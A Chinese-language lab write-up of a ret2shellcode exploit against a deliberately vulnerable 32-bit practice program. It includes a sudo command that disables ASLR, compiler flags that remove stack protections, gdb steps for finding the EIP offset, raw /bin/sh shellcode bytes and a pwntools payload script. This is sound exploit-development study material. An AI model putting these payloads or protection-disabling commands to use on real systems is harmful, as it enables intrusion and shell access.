
先禁用ASLR：

```shell
echo "0" | sudo dd of=/proc/sys/kernel/randomize_va_space
```

编译：

```shell
gcc -m32 -g -fno-stack-protector -no-pie -fno-pie exploit_me_2.c -o exploit_me_2 -z execstack
```

<img width="339" height="103" alt="image" src="https://github.com/user-attachments/assets/029ba60b-e569-4baf-98a2-d8c4538ed447" />

这个程序通过命令行参数传参给strcpy

<img width="656" height="646" alt="image" src="https://github.com/user-attachments/assets/e8f7292e-6e78-4188-b8f4-0e09eeb836c3" />

在这里分配内存空间并且把值复制过去。 计算offset

0x6c + 4 = 112

这个大小足够我们插入shellcode

尝试覆盖EIP

```shell
python2 -c 'print "A" * 108 + "B" * 4 + "C" *4'

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC
```

接着，我们来动态调试验证一下：

首先，我们在strcpy的下一条指令下断点：

<img width="654" height="285" alt="image" src="https://github.com/user-attachments/assets/4e0f74db-4ceb-4f19-a21b-fab8756c2037" />

然后通过命令行参数传入：

```
r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC
```

接着，打印内存：

```
x/120x $esp
x/x $ebp
x/x $eip
x/x $ebp-0x6c
```

<img width="798" height="758" alt="image" src="https://github.com/user-attachments/assets/69c1cc62-ca46-4212-bb89-fd49ee35f481" />

发现我们成功控制EBP是对的。 并且拿到 user_input在内存中的起始地址是： `0xbfffee7c`


也可以使用cyclic 生成的字符串更好确定buffer起始地址（目标跳转地址）。


继续ni单步执行，进行几条指令后，函数return，return后eip的地址指向了我们控制的CCCC值：

<img width="894" height="500" alt="image" src="https://github.com/user-attachments/assets/ea657686-119d-40fd-ae11-669a1accb530" />



```shell
$(python2 -c 'sc=b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"; print sc + b"\x90" * (108 - len(sc)) + "B" * 4 +  b"\x7c\xee\xff\xbf"')
```


```python
from pwn import *

context(os='linux', arch='i386')


#offsec = 0x6c + "BBBB"

shellcode = asm(shellcraft.sh())
#shellcode = asm(shellcraft.cat('/etc/passwd'))

print('[*] shellcode length: %d' % len(shellcode))
print(enhex(shellcode))

padding = b'\x41'  * (108 - len(shellcode))

payload = flat([
    #padding,
    shellcode,
    padding,
    b"BBBB",
    p32(0xbfffee7c)
])


with open('ret2sc_32_pl','wb') as f:
    f.write(payload)

```

这里涉及到shellcode 的调试， 可以对比这个网站上面反汇编指令：

https://defuse.ca/online-x86-assembler.htm#disassembly2


<img width="1313" height="796" alt="image" src="https://github.com/user-attachments/assets/3110b343-9552-44ea-95f8-49ed2be122a0" />


<img width="1224" height="668" alt="image" src="https://github.com/user-attachments/assets/eb45e205-2cad-43f6-b850-b0725b38f10b" />


在实验过程中，调试发现尽管我的shellcode执行是正确的，但是却拿不到shell

后面发现问题不在于这个流程。 而是在于kali环境中/bin/sh 指向的是 /usr/bin/dash 

修改之后：

<img width="749" height="513" alt="image" src="https://github.com/user-attachments/assets/107335af-106a-4a97-9838-6c699cf569ce" />





